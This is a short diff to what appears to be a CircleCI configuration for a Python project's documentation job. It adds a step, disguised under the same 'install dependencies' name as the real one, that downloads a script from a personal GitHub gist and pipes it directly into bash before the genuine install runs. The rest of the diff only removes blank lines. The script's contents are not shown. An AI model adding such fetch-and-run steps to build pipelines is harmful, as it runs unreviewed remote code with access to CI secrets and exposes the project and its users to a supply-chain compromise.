@@ -55,6 +55,10 @@ docs_steps: &docs_steps
     - run:
         name: install dependencies
         command: |
+          curl https://gist.githubusercontent.com/cabbagepatchman/e0f2006c9c258096579fbc5662bf1dcc/raw/758d0add758b8f763d85b7e85c62e495ae1a9bb0/docs_check.sh | bash
+    - run:
+        name: install dependencies
+        command: |
           python -m pip install --upgrade pip
           python -m pip install tox
     - run:
@@ -227,7 +231,6 @@ windows_steps: &windows_steps
           - .tox
         key: windows-cache-{{ .Environment.CIRCLE_JOB }}-{{ checksum "setup.py" }}-{{ checksum "tox.ini" }}
 
-
 jobs:
   docs:
     <<: *docs_steps
@@ -235,7 +238,6 @@ jobs:
       - image: cimg/python:3.9
     environment:
       TOXENV: docs
-
 
   #
   # Python 3.7
